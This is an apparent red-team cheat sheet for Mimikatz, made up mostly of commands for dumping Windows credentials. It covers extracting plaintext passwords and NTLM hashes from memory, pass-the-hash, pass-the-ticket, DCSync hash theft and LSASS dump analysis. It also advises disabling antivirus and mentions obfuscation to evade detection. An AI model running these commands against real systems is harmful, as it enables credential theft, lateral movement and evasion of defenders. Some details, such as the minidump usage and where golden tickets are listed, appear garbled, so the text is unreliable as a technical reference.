## Mimikatz

Mimikatz is an open-source tool that allows attackers to extract sensitive information, such as plaintext passwords, NTLM hashes, Kerberos tickets, and certificates, from Windows memory. It is a crucial tool for credential access and lateral movement in Windows environments.

### Installation

Mimikatz can be downloaded from its official GitHub repository. It is often flagged by antivirus software due to its legitimate use by attackers, so it might need to be run in a controlled environment or with antivirus disabled.

* **Download:**

    ```
    git clone https://github.com/gentilkiwi/mimikatz.git
    ```

    Or download pre-compiled binaries from the releases page.

### Basic Usage

Mimikatz is typically run from an elevated command prompt (Administrator privileges).

* **Run Mimikatz:**

    ```powershell
    mimikatz.exe
    ```

* **Enable Debug Privilege:** This is often required for Mimikatz to access process memory.

    ```
    privilege::debug
    ```

* **Extract Passwords (plaintext, hashes, Kerberos):**

    ```
    sekurlsa::logonpasswords
    ```

* **Extract Kerberos Tickets:**

    ```
    kerberos::list
    kerberos::golden
    ```

* **Pass-the-Hash (PTH):** Authenticate to a remote system using an NTLM hash.

    ```
    sekurlsa::pth /user:username /domain:domain /ntlm:hash /run:"cmd.exe"
    ```

* **Pass-the-Ticket (PTT):** Inject a Kerberos ticket into the current session.

    ```
    kerberos::ptt <base64_ticket_blob>
    ```

* **DCSync:** Simulate a Domain Controller to request password hashes for any user.

    ```
    lsadump::dcsync /domain:domain.local /user:user_to_dump
    ```

### Advanced Techniques

* **MiniDump:** Dump the LSASS process memory for offline analysis.

    ```
    sekurlsa::minidump <pid>
    ```

    Then use `sekurlsa::logonpasswords` on the dumped file:

    ```
    mimikatz.exe "log minidump.log" "sekurlsa::minidump <path_to_lsass.dmp>" "sekurlsa::logonpasswords" exit
    ```

* **Bypassing Antivirus:** Mimikatz is often detected by AV. Techniques like obfuscation, reflective DLL injection, or using custom builds might be necessary to bypass detection.

Mimikatz is an extremely powerful tool for Windows post-exploitation. Its capabilities extend beyond just password extraction, making it a staple in red team operations.
